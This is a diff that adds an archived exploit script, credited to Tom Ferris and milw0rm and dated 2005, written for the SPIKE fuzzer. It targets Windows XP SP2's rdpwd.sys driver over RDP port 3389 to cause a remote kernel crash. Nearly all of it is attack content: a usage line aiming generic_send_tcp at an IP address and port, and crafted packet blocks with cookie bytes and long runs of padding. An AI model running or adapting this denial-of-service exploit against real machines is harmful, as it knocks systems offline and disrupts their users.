@@ -1,0 +1,38 @@
+// get SPIKE here: http://www.immunitysec.com/resources-freesoftware.shtml /str0ke
+//
+// Windows XP SP2 'rdpwd.sys' Remote Kernel DoS
+// 
+// Discovered by: 
+// Tom Ferris
+// tommy[at]security-protocols[dot]com
+//
+// Tested on:
+// Microsoft Windows XP SP2
+// 
+// Usage (SPIKE) : ./generic_send_tcp 192.168.1.100 3389 remoteass.spk 1 0
+// 
+// 8/9/2005 Security-Protocols.com
+//
+// This program is free software; you can redistribute it and/or modify it under 
+// the terms of the GNU General Public License version 2, 1991 as published by
+// the Free Software Foundation.
+
+s_block_start("packet_1");
+s_string_variable("03");
+s_binary("03 00 00 27 22 E0 00 00 00 00 00 43 6F 6F 6B 69 65 3A 20 6D 73 74 73 68 61 73 68 3D 41 64 6D 69 6E 69 73 74 72 0D 0A");
+s_binary("03 00 00 27 22 E0 00 00 00 00 00 43 6F 6F 6B 69 65 3A");
+s_string_variable("");
+s_binary("41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41");
+s_string_variable("");
+s_block_end("packet_1");
+
+s_block_start("packet_2");
+s_int_variable(0x0500,5);
+s_block_end("packet_2");
+
+s_block_start("packet_3");
+s_binary("000002020000");
+s_string_variable("");
+s_block_end("packet_3");
+
+// milw0rm.com [2005-08-09]
